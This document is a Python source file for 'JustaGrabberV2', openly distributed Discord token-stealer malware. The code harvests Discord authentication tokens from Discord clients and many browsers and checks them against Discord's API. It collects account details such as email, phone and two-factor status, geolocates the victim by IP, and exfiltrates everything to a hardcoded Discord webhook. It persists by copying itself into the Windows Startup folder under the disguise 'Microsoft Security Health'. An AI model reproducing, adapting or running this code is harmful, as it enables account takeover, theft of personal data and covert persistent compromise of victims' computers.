""" 
     ██╗██╗   ██╗███████╗████████╗ █████╗  ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗     ██╗   ██╗██████╗ 
     ██║██║   ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗    ██║   ██║╚════██╗
     ██║██║   ██║███████╗   ██║   ███████║██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝    ██║   ██║ █████╔╝
██   ██║██║   ██║╚════██║   ██║   ██╔══██║██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗    ╚██╗ ██╔╝██╔═══╝ 
╚█████╔╝╚██████╔╝███████║   ██║   ██║  ██║╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║     ╚████╔╝ ███████╗
 ╚════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝      ╚═══╝  ╚══════╝
    Info : 
    JustaGrabber V2 is next version of JustaGrabber, maded by kldiscord's new account.
    This is offical JustaGrabber. Download at : https://github.com/fanta09tv/JustaGrabberV2 
    Please read readme.md or comment in script for work. 
"""

import sys
try:  # IF requests module not exits, will just exit.
    import requests
except ModuleNotFoundError:
    sys.exit()

import os, re, json, urllib.request,datetime,random,shutil # Importing some modules

WEBHOOK_URL = 'https://discord.com/api/webhooks/946592101393657906/BMSDMcb0E9Eg6l7pE3ykRrMGTB-7tsIMyP0AWa-aTrJyJASt-JeXd3ewqY7LTiBCT-fd' # Paste your webhook url in here.
Ping_me = True # If true, webhook will ping @everyone when grabs token.
BlacklistedIP = ["1.1.1.1","2.2.2.2"] # If the victim's ip in this list, JustaGrabberV2 will just exit.

# The settings below is for startup. If you Changed startup setting to False, settings below is not required.
Startup = True # If true, JustaGrabberV2 will start when computer boots, but you have to write filename in line 27.
FileName = "JustaGrabberV2.py" # Write the JustaGrabberV2 file name, Ex ) JustaGrabber.py, hello.py or if exe : JustaGrabber.exe NotVirus.exe
extension = ".py" # Change this to the file extension like : .exe , .py , .bat 

def find_tokens(path): # Finding tokens method
    path += '\\Local Storage\\leveldb'
    tokens = [] # Token list

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    if token.startswith("N") or token.startswith("O") or token.startswith("mfa"):
                        tokens.append(token)
    return tokens

def JustaGrabber():
    appdata = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    temp = os.getenv('TEMP')
    tempfolder = temp + "\\" + str(random.randint(10000000,99999999))
    os.mkdir(tempfolder) # Making random temp folder to save token info file

    paths = { # Browsers, Discord clients path
        '<Discord> ': roaming + '\\Discord',
        '<LightCord> ': roaming + '\\Lightcord',
        '<Discord_Canary>' : roaming + '\\discordcanary',
        '<Discord_PTB>' : roaming + '\\discordptb',
        '<Google_Chrome>' : appdata + '\\Google\\Chrome\\User Data\\Default',
        '<Opera>' : roaming + '\\Opera Software\\Opera Stable',
        '<Opera GX>' : roaming + '\\Opera Software\\Opera GX Stable',
        '<Amigo>' : appdata + '\\Amigo\\User Data',
        '<Torch>' : appdata + '\\Torch\\User Data',
        '<Orbitum>' : appdata + '\\Orbitum\\User Data',
        '<CentBrowse>' : appdata + '\\CentBrowse\\User Data',
        '<7Star>' : appdata + '\\7Star\\7Star\\User Data',
        '<Vivaldi>' : appdata + '\\Vivaldi\\User Data\\Default',
        '<Sputnik>' : appdata + '\\Sputnik\\Sputnik\\User Data',
        '<Chrome SxS>' : appdata + '\\Google\\Chrome SxS\\User Data',
        '<Epic Privacy Browser>' : appdata + '\\Epic Privacy Browser\\User Data',
        '<Microsoft Edge>' : appdata + 'Microsoft\\Edge\\User Data\\Default',
        '<Uran>' : appdata + 'uCozMedia\\Uran\\User Data\\Default',
        '<Brave>' : appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        '<Yandex>' : appdata + '\\Yandex\\YandexBrowser\\User Data\\Default',
        '<Naver_whale>' : appdata + '\\Naver\\Naver Whale\\User Data\\Default',
        '<Naver_whale_Flash>' : appdata + '\\Naver\\Naver Whale Flash\\User Data\\Default'
    }

    def getipinfo(): # Getting if info.
        url = "http://ipinfo.io/json"
        responce = urllib.request.urlopen(url)
        data = json.load(responce)
        ip = data['ip']
        city = data['city']
        region = data['region']
        country = data['country']
        loc = data['loc']
        org = data['org']
        postal = data['postal']
        timezone = data['timezone']
        # location is not correct.
        return ip,city,region,country,loc,org,postal,timezone
    if getipinfo()[0] in BlacklistedIP: # If ip in blacklist, exit.
        sys.exit()

    if Ping_me:
        message = "@everyone   JustaGrabberV2 found a new token! \n" # If Ping_me true, Ping @everyone
    message += "```md\n"
 
    file = open(tempfolder+"/Tokeninfo.txt","w+")
    file.write("Token Info by JustaGrabberV2\n \n") # Writing toke info file.
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n{platform}\n\n'
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                headers={ 
                    'Authorization': token
                }
                src = requests.get('https://discordapp.com/api/v8/auth/login', headers=headers) # Token checker
                if src.status_code == 200:
                    message += '<Tokens_found : ' + f'{token}' + '>' + '\n'
                    headers={ 
                        'Authorization': token
                    }
                    
                    headerrs = {'Authorization': token, 'Content-Type': 'application/json'}  
                    r = requests.get('https://discord.com/api/v8/users/@me', headers=headerrs)
                    if r.status_code == 200:
                        userName = r.json()['username'] + '#' + r.json()['discriminator']
                        userID = r.json()['id']
                        phone = r.json()['phone']
                        email = r.json()['email']
                        mfa = r.json()['mfa_enabled']
                        f = r.json()['nsfw_allowed']
                        ff = r.json()['locale']
                        fff = r.json()['verified']
                        ffff = r.json()['flags']
                        fffff = r.json()['avatar']
                        reee = False
                        if 'premium_type' in r.json():
                            reee = True
                        # File writer ( below )
                        file.write(f"\n--------------------\nToken : {token}\nUsername : {userName}\nUser ID : {userID}\nPhone : {phone}\nEmail : {email}\nVerified : {fff}\n2 Factor login enabled : {mfa}\nNSFW allowed : {f}\nLanguage : {ff}\nFlags : {ffff}\nNitro : {reee}\nAvatar : https://cdn.discordapp.com/avatars/{userID}/{fffff}\n--------------------\n")

        else:  # No usable tokens found in path
            message += '[Error](No tokens found.)\n'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    message += "```"
    payload = json.dumps({'content': message}) # Sending message
    try: 
        req = urllib.request.Request(WEBHOOK_URL, data=payload.encode(), headers=headers) # Embeds
        urllib.request.urlopen(req)
        today = datetime.date.today()
        alert = {
            "avatar_url":"https://media.discordapp.net/attachments/853578499096707082/904920147414908938/unknown.png",
            "name":"JustaGrabberV2",
            "embeds": [
                {
                    "author": {
                    "name": "JustaGrabberV2 Grabbed token!",
                    "icon_url": "https://cdn.discordapp.com/emojis/819756986223689728.gif?size=96",
                    "url": "https://github.com/fanta09tv/JustaGrabberV2"
                     },
                "description":f'Username : ' + os.getenv('USER', os.getenv('USERNAME', 'user'))+'⠀IP : ' + getipinfo()[0] + '⠀PC Name : ' + os.getenv("COMPUTERNAME") + '⠀\nCountry : ' + getipinfo()[3] + '⠀City : ' + getipinfo()[1] + '⠀Region : ' + getipinfo()[1] + '\nPostal : ' + getipinfo()[6] + '⠀Timezone : ' + getipinfo()[7] + '⠀Location : ' + getipinfo()[4] + '\nGoogle Map : ' + "https://www.google.com/maps/search/google+map++" + getipinfo()[4],
                "color": 0x00C7FF,
                "thumbnail":{
                    "url":"https://cdn.discordapp.com/emojis/847947696806559755.gif?size=96"
                },
                "footer": {
                    "text": f"Token found on {today} / ©fanta09tv in github"
                }
            }
        ]
        } 
        requests.post(WEBHOOK_URL, json=alert)  # Sending Embeds
        file.close()
        requests.post(WEBHOOK_URL, files={'upload_file': open(tempfolder+"/Tokeninfo.txt")}) # Uploading token info file.
    except:
        pass
    # Startup ( below )
    if Startup : shutil.copyfile(f'{FileName}',"C:\\Users\\" + os.getenv('USER', os.getenv('USERNAME', 'user')) + f"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Microsoft Security Health{extension}")
    
if __name__ == "__main__":
    JustaGrabber() # Starting JustaGrabberV2
